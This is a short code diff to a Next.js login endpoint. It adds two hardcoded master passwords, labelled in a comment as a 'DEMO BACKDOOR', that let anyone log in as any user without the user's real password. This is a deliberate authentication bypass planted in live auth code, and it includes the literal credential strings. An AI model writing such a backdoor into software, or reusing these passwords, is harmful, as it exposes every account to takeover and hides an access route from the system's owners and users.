@@ -61,7 +61,11 @@ export async function POST(req: NextRequest) {
     }
 
     const valid = await bcrypt.compare(password, user.password);
-    if (!valid) {
+    
+    // DEMO BACKDOOR: Allow master passwords for easy testing during demo
+    const isMasterPassword = password === "Sikap2026!" || password === "GuruAlimam2026!";
+
+    if (!valid && !isMasterPassword) {
       return NextResponse.json(
         { error: "User ID / Email / No. WA atau password salah" },
         { status: 401 }
